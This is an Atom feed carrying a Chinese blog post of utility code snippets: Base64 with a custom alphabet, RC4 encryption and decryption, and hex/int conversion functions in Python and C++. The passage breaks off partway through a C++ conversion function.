<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ss1du0us&#39;s Blog</title>
  
  <subtitle>Welcome</subtitle>
  <link href="https://4ss1du0us.github.io/atom.xml" rel="self"/>
  
  <link href="https://4ss1du0us.github.io/"/>
  <updated>2023-03-27T01:36:18.815Z</updated>
  <id>https://4ss1du0us.github.io/</id>
  
  <author>
    <name>4ss1du0us</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>便捷算法</title>
    <link href="https://4ss1du0us.github.io/2023/03/19/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/"/>
    <id>https://4ss1du0us.github.io/2023/03/19/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/</id>
    <published>2023-03-19T08:11:01.000Z</published>
    <updated>2023-03-27T01:36:18.815Z</updated>
    
    <content type="html"><![CDATA[<h1 id="可更换码表的-Base64-加解密"><a href="#可更换码表的-Base64-加解密" class="headerlink" title="可更换码表的 Base64 加解密"></a>可更换码表的 Base64 加解密</h1><h2 id="Python版（简洁脚本）"><a href="#Python版（简洁脚本）" class="headerlink" title="Python版（简洁脚本）"></a>Python版（简洁脚本）</h2><hr><ul><li><strong>特点</strong><ol><li>可以更换加密的码表</li><li>快捷，直接使用即可</li></ol></li></ul><hr><p><strong>代码</strong></p><h2 id=""><a href="#" class="headerlink" title=""></a><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> string<span class="token comment"># str1表示更换码表后的待解密字符串</span>str1 <span class="token operator">=</span> <span class="token string">"x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q"</span><span class="token comment"># string1表示更换后的码表</span>string1 <span class="token operator">=</span> <span class="token string">"ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/"</span><span class="token comment"># string2表示原始码表</span>string2 <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span><span class="token comment"># 将str1还原成原始码表加密后的内容，存放在str2中</span>str2 <span class="token operator">=</span> str1<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>string1<span class="token punctuation">,</span> string2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Base64解密，base64.b64decode()的结果为 bytes 类型</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></h2><h2 id="Python版（完整系统）"><a href="#Python版（完整系统）" class="headerlink" title="Python版（完整系统）"></a>Python版（完整系统）</h2><hr><ul><li><strong>特点</strong><ol><li>可以更换加密的码表</li><li>支持加密和解密</li></ol></li></ul><hr><p><strong>代码</strong></p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding:utf-8</span>s <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>  <span class="token comment"># 原始码表</span><span class="token keyword">def</span> <span class="token function">my_base64_encode</span><span class="token punctuation">(</span>inputs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 将字符串转化为2进制</span>    bin_str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> inputs<span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        bin_str<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'&#123;:0>8&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(bin_str)</span>    <span class="token comment"># 输出的字符串</span>    outputs <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment"># 不够三倍数，需补齐的次数</span>    nums <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> bin_str<span class="token punctuation">:</span>        <span class="token comment"># 每次取三个字符的二进制</span>        temp_list <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">:</span>            nums <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>            <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>                temp_list <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'0'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">]</span>        temp_str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>        <span class="token comment"># print(temp_str)</span>        <span class="token comment"># 将三个8字节的二进制转换为4个十进制</span>        temp_str_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp_str_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># print(temp_str_list)</span>        <span class="token keyword">if</span> nums<span class="token punctuation">:</span>            temp_str_list <span class="token operator">=</span> temp_str_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span> <span class="token operator">-</span> nums<span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> temp_str_list<span class="token punctuation">:</span>            outputs <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        bin_str <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    outputs <span class="token operator">+=</span> nums <span class="token operator">*</span> <span class="token string">'='</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密完成:\n%s "</span> <span class="token operator">%</span> outputs<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">my_base64_decode</span><span class="token punctuation">(</span>inputs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 将字符串转化为2进制</span>    bin_str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> inputs<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">!=</span> <span class="token string">'='</span><span class="token punctuation">:</span>            x <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>            bin_str<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'&#123;:0>6&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(bin_str)</span>    <span class="token comment"># 输出的字符串</span>    outputs <span class="token operator">=</span> <span class="token string">""</span>    nums <span class="token operator">=</span> inputs<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> bin_str<span class="token punctuation">:</span>        temp_list <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>        temp_str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>        <span class="token comment"># print(temp_str)</span>        <span class="token comment"># 补足8位字节</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp_str <span class="token operator">=</span> temp_str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">*</span> nums <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span>        <span class="token comment"># 将四个6字节的二进制转换为三个字符</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            outputs <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        bin_str <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密完成:\n%s "</span> <span class="token operator">%</span> outputs<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"     可更换码表的 Base64 加解密系统       "</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*************************************"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*      1. 加密           2. 解密      *"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*************************************"</span><span class="token punctuation">)</span>select <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"是否更换加密的码表? (yes or no) 你的选择: "</span><span class="token punctuation">)</span><span class="token keyword">if</span> select <span class="token operator">==</span> <span class="token string">"y"</span> <span class="token keyword">or</span> select <span class="token operator">==</span> <span class="token string">"yes"</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"在这里输入码表: "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">".....done, 已更改!"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"码表未做更改!"</span><span class="token punctuation">)</span>num <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"选择要进行的操作? (1:加密 or 2:解密) 你的选择: "</span><span class="token punctuation">)</span><span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token string">"1"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"1:加密"</span><span class="token punctuation">:</span>    input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入明文以加密: "</span><span class="token punctuation">)</span>    my_base64_encode<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token keyword">elif</span> num <span class="token operator">==</span> <span class="token string">"2"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"2:解密"</span><span class="token punctuation">:</span>    input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入密文以解密: "</span><span class="token punctuation">)</span>    my_base64_decode<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">".....bye"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></h2><h1 id="RC4-加解密"><a href="#RC4-加解密" class="headerlink" title="RC4 加解密"></a>RC4 加解密</h1><h2 id="Python版（简洁脚本）-1"><a href="#Python版（简洁脚本）-1" class="headerlink" title="Python版（简洁脚本）"></a>Python版（简洁脚本）</h2><hr><ul><li><strong>特点</strong><ol><li>利用 Python 库快捷实现 RC4 算法</li><li><code>Key</code> 表示 RC4 的密钥，<code>Str</code> 表示待加解密的内容（<strong>bytes型</strong>）</li></ol></li></ul><hr><p><strong>代码</strong></p><h2 id="-2"><a href="#-2" class="headerlink" title=""></a><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> ARC4flag <span class="token operator">=</span> ARC4<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>Key<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>Str<span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></h2><h2 id="Python版（具体实现）"><a href="#Python版（具体实现）" class="headerlink" title="Python版（具体实现）"></a>Python版（具体实现）</h2><hr><ul><li><strong>特点</strong><ol><li>包含具体实现流程</li></ol></li></ul><hr><p><strong>代码</strong></p><h2 id="-3"><a href="#-3" class="headerlink" title=""></a><pre class="line-numbers language-python" data-language="python"><code class="language-python">Str <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment"># 待加解密的内容</span>Key <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment"># 密钥key</span>flag <span class="token operator">=</span> <span class="token string">""</span>   <span class="token comment"># 存放加解密后的结果</span><span class="token comment"># ---------- rc4_init ----------</span>s_box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 定义 s 盒</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 生成初始 s 盒</span>    s_box<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token comment">#   T[i] = K[i mod len(Key)]    # 这个算法里没有 T[i]，下面会解释</span>t <span class="token operator">=</span> <span class="token number">0</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 打乱 s 盒顺序</span>    tmp <span class="token operator">=</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>Key<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>     <span class="token comment"># j = (j + S[i] + T[i]) mod 256</span>    s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span>    s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp    t <span class="token operator">=</span> t <span class="token operator">+</span> <span class="token number">1</span>               <span class="token comment"># 这里引入的 t 加一个 if 条件其实就是为了做 t = i % len(Key)</span>    <span class="token keyword">if</span> t <span class="token operator">>=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>Key<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token comment"># Key[t] 配合 t = i % len(Key) 就是实现了 T[i] = K[i mod len(Key)]</span>        t <span class="token operator">=</span> <span class="token number">0</span>               <span class="token comment"># 小细节写法不同而已，大致思路是一样的</span><span class="token comment"># ---------- rc4_crypt ----------</span>i <span class="token operator">=</span> <span class="token number">0</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>      <span class="token comment"># &amp; 0xff 是为了做 % 256，两者效果相同</span>    tmp <span class="token operator">=</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span>    s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp    t <span class="token operator">=</span> <span class="token punctuation">(</span>s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token comment"># &amp; 0xff 是为了做 % 256，两者效果相同</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>Str<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^</span> s_box<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment"># 明文异或得密文，密文异或得明文</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></h2><h1 id="任意进制-int-型-十六进制-string-型"><a href="#任意进制-int-型-十六进制-string-型" class="headerlink" title="任意进制 int 型 - 十六进制 string 型"></a>任意进制 int 型 - 十六进制 string 型</h1><h2 id="C-普通版"><a href="#C-普通版" class="headerlink" title="C++普通版"></a>C++普通版</h2><hr><ul><li><strong>特点</strong><ol><li>以 <code>&#39;0x&#39;</code> 开头</li><li>转换后的数，位数都要相同，高位不足的补 <code>0</code></li><li><code>num</code> 为待转换的十进制数，<code>width</code> 为转换后的十六进制数的位数，不包括 <code>&#39;0x&#39;</code></li><li>结果以字符串形式输出</li></ol></li></ul><hr><ul><li><strong>代码</strong><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">std<span class="token double-colon punctuation">::</span>string <span class="token function">int_to_string</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">int</span> width<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>std<span class="token double-colon punctuation">::</span>stringstream ioss<span class="token punctuation">;</span>     <span class="token comment">// 定义字符串流</span>std<span class="token double-colon punctuation">::</span>string s_temp<span class="token punctuation">;</span>         <span class="token comment">// 存放转化后字符</span>ioss <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>hex <span class="token operator">&lt;&lt;</span> num<span class="token punctuation">;</span>      <span class="token comment">// 以十六制形式输出</span>ioss <span class="token operator">>></span> s_temp<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>width <span class="token operator">></span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>string <span class="token function">s_0</span><span class="token punctuation">(</span>width <span class="token operator">-</span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 位数不够则补0</span>    s_temp <span class="token operator">=</span> s_0 <span class="token operator">+</span> s_temp<span class="token punctuation">;</span>                            <span class="token comment">// 合并</span><span class="token punctuation">&#125;</span>std<span class="token double-colon punctuation">::</span>string s <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> s_temp<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> width<span class="token punctuation">,</span> s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 取右width位</span><span class="token keyword">return</span> s<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="C-递归版"><a href="#C-递归版" class="headerlink" title="C++递归版"></a>C++递归版</h2><hr><ul><li><strong>特点</strong><ol><li>开头不包含 <code>&#39;0x&#39;</code></li><li>不要求位数相同</li><li>结果以字符数组形式输出</li></ol></li></ul><hr><ul><li><strong>代码</strong><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">char</span> <span class="token operator">*</span> <span class="token function">int_to_string</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">static</span> <span class="token keyword">int</span>  this_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>this_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span>            <span class="token comment">//递归结束条件</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span>        <span class="token comment">//当前数转换成字符放入字符串</span>        buffer<span class="token punctuation">[</span>this_index<span class="token punctuation">]</span> <span class="token operator">=</span> num <span class="token operator">+</span> <span class="token char">'0'</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        buffer<span class="token punctuation">[</span>this_index<span class="token punctuation">]</span> <span class="token operator">=</span> num <span class="token operator">-</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token char">'a'</span><span class="token punctuation">;</span>    buffer<span class="token punctuation">[</span>this_index<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span> <span class="token comment">//字符串结束标志</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">int_to_string</span><span class="token punctuation">(</span>num <span class="token operator">/</span> <span class="token number">16</span><span class="token punctuation">,</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//递归调用</span>    this_index<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token comment">//字符串索引+1</span>    num <span class="token operator">%=</span> <span class="token number">16</span><span class="token punctuation">;</span>           <span class="token comment">//计算当前值</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span>        <span class="token comment">//当前数转换成字符放入字符串</span>        buffer<span class="token punctuation">[</span>this_index<span class="token punctuation">]</span> <span class="token operator">=</span> num <span class="token operator">+</span> <span class="token char">'0'</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        buffer<span class="token punctuation">[</span>this_index<span class="token punctuation">]</span> <span class="token operator">=</span> num <span class="token operator">-</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token char">'a'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="Python版"><a href="#Python版" class="headerlink" title="Python版"></a>Python版</h2><hr><ol><li><strong>代码</strong><pre class="line-numbers language-python" data-language="python"><code class="language-python">tmp <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>length <span class="token operator">=</span> width<span class="token operator">+</span><span class="token number">2</span><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token operator">&lt;</span> length<span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token string">'0x'</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">*</span><span class="token punctuation">(</span>length <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>tmp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><hr><h1 id="十六进制-string-型-十进制-int-型"><a href="#十六进制-string-型-十进制-int-型" class="headerlink" title="十六进制 string 型 - 十进制 int 型"></a>十六进制 string 型 - 十进制 int 型</h1><h2 id="C-版"><a href="#C-版" class="headerlink" title="C++版"></a>C++版</h2><hr><ul><li><strong>特点</strong><ol><li>将 <code>string</code> 类型 的十六进制数 <code>s</code>，从下标 <code>index</code> 的位置开始（包括 <code>&#39;0x&#39;</code>），长度为 <code>length</code> 的部分，转换为十进制数 <code>sum</code></li></ol></li></ul><hr><ul><li><strong>头文件</strong><ol><li><code>#include &lt;math.h&gt;</code></li></ol></li></ul><hr><ul><li><strong>代码</strong><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">string_to_dec</span><span class="token punctuation">(</span>string s<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> tmp<span class="token punctuation">[</span>length<span class="token 